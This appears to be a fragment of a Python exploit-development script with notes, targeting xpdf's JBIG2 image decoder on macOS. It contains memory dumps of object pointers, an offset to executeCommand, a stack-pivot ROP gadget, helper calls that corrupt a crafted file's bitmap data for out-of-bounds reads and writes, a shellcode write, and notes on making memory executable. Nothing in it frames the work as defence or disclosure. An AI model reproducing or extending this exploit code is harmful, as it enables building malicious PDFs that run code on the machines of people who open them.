	0x1001645e8: 0x00000001000a1d10 xpdf`JBIG2Bitmap::~JBIG2Bitmap() at JBIG2Stream.cc:763
	0x1001645f0: 0x00000001000a1d20 xpdf`JBIG2Bitmap::~JBIG2Bitmap() at JBIG2Stream.cc:763
	0x1001645f8: 0x00000001000aab70 xpdf`JBIG2Bitmap::getType() at JBIG2Stream.cc:692
	0x100164600: 0x0000000000000000

	executeCommand is 0x819C0 under JBIG2Bitmap::getType()
	above getType()

	gadget to stack pivot... now how to get data onto stack?
	0x0000000100040fd7 : pop rsp ; ret

	"""



	"""
	replace_bytes_at_offset(f, struct.pack("<I", 0xeeeeeeee), rax_high)
	replace_bytes_at_offset(f, struct.pack("<I", 0xeeeeeeee), rax)
	replace_bytes_at_offset(f, struct.pack("<I", 0x11111111), rbx)
	replace_bytes_at_offset(f, struct.pack("<I", 0x11111111), rbx_high)
	replace_bytes_at_offset(f, struct.pack("<I", 0x1), rcx)
	replace_bytes_at_offset(f, struct.pack("<I", 0x0), rcx_high)
	replace_bytes_at_offset(f, struct.pack("<I", 0x41414141), rdx)		
	replace_bytes_at_offset(f, struct.pack("<I", 0x41414141), rdx_high)

	add_64(f, rax, rbx)
	add_64(f, rax, rcx)
	add_64(f, rax, rdx)

	read_from_offset_to_offset(f, 0x40, rax, 0, spoofed_bitmap_data, 0)
	f.write(debug_sh.raw())
	"""

	# will crash
	#read_from_calculated_offset_to_offset(f, 1, rdx, 0)




	# simulate caculating line to arbitrary write
	#replace_bytes_at_offset(f, struct.pack("<I", 0x80000000), data_buffer_to_bitmap + 0x14)

	#read_from_calculated_offset_to_offset(f, 1, 0x20, 0)











"""
0x13a79370, h: 0x13a79370, w: 0x7fad, line: 0x7fad

70 93 A7 13 AD 7F 00 00 70 93 A7 13 AD 7F 00 00
70 93 A7 13 AD 7F 00 00
"""






"""
should test if mmap and mprotect can be called to make a page writable, then not writable, then executable


https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_security_cs_allow-unsigned-executable-memory
https://stackoverflow.com/questions/60654834/using-mprotect-to-make-text-segment-writable-on-macos


https://blog.shpik.kr/osx,/macos,/heap,/pwnable/2019/05/09/OSX_Heap_Exploitation.html
"""







